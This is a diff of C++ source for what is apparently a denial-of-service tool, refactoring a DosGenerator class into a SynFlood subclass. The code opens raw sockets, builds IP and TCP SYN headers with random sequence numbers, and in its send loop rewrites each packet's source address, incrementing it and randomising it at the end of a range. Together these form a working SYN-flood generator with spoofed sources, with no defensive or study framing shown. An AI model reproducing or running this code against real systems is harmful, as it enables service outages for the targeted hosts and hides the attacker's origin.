@@ -22,9 +22,36 @@ void DosGenerator::set_raw_fd(int raw_fd)
     raw_fd_ = raw_fd;
 }
 
-bool DosGenerator::init_iph(uint32_t src_ip, uint32_t dest_ip)
+
+void DosGenerator::switchPower()
+{
+    power_ = !power_;
+}
+
+DosGenerator::DosGenerator()
 {
 
+}
+
+bool DosGenerator::pcd_init(const char * dev)
+{
+    pcd_ = pcap_open_live(dev,BUFSIZ,0,1,pcap_error_buf_);
+    if(pcd_==NULL)
+        return false;
+
+    return true;
+}
+
+bool DosGenerator::raw_init(int type)
+{
+    if((raw_fd_ = socket(AF_INET,SOCK_RAW,type))<0)
+        return false;
+
+    return true;
+}
+
+bool SynFlood::init_iph(uint32_t src_ip, uint32_t dest_ip)
+{
     memset(&iph_,0,sizeof(struct iphdr));
 
     //set ip header
@@ -41,10 +68,9 @@ bool DosGenerator::init_iph(uint32_t src_ip, uint32_t dest_ip)
 
     return true;
 
-
 }
 
-bool DosGenerator::init_iph(Ip &src_ip, Ip &dest_ip)
+bool SynFlood::init_iph(Ip &src_ip, Ip &dest_ip)
 {
     memset(&iph_,0,sizeof(struct iphdr));
 
@@ -63,7 +89,7 @@ bool DosGenerator::init_iph(Ip &src_ip, Ip &dest_ip)
     return true;
 }
 
-bool DosGenerator::init_tcph(uint16_t src_port, uint16_t dest_port)
+bool SynFlood::init_tcph(uint16_t src_port, uint16_t dest_port)
 {
     memset(&tcph_,0,sizeof(struct tcphdr));
 
@@ -75,25 +101,18 @@ bool DosGenerator::init_tcph(uint16_t src_port, uint16_t dest_port)
     tcph_.dest = htons(dest_port);
     tcph_.seq = rand() % UINT32_MAX;
     return true;
-
 }
 
-bool DosGenerator::set_iph_src(uint32_t &src_ip)
+bool SynFlood::set_iph_src(uint32_t &src_ip)
 {
     iph_.saddr=htonl(src_ip);
 
     return true;
 }
 
-void DosGenerator::switchPower()
+
+void SynFlood::generate()
 {
-    power_ = !power_;
-}
-
-void DosGenerator::generate()
-{
-
-
 
     iph_.tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions));
     tcph_.doff = (sizeof(struct tcphdr) + sizeof(SynOptions)) / 4;
@@ -152,11 +171,13 @@ void DosGenerator::generate()
             std::cout<<"send to error! here's packet."<<std::endl;
             printByHexData(packet,sizeof(packet));
         }
-//        target_ip_.set_rand_ip();
+
+        //Auto Increase IP addr
         if(!target_ip_.inc_ip_addr())
         {
-            std::cout<<"Call!!!"<<std::endl;
+            //if reach at end of network addr(braodcast)
             target_ip_.set_rand_ip();
+
         }
         memcpy(&iph->saddr,target_ip_.get_ip_ptr(),4);
         calIPChecksum((uint8_t*)iph);
@@ -164,26 +185,4 @@ void DosGenerator::generate()
     }
 
 
-}
-
-DosGenerator::DosGenerator()
-{
-
-}
-
-bool DosGenerator::pcd_init(const char * dev)
-{
-    pcd_ = pcap_open_live(dev,BUFSIZ,0,1,pcap_error_buf_);
-    if(pcd_==NULL)
-        return false;
-
-    return true;
-}
-
-bool DosGenerator::raw_init(int type)
-{
-    if((raw_fd_ = socket(AF_INET,SOCK_RAW,type))<0)
-        return false;
-
-    return true;
 }
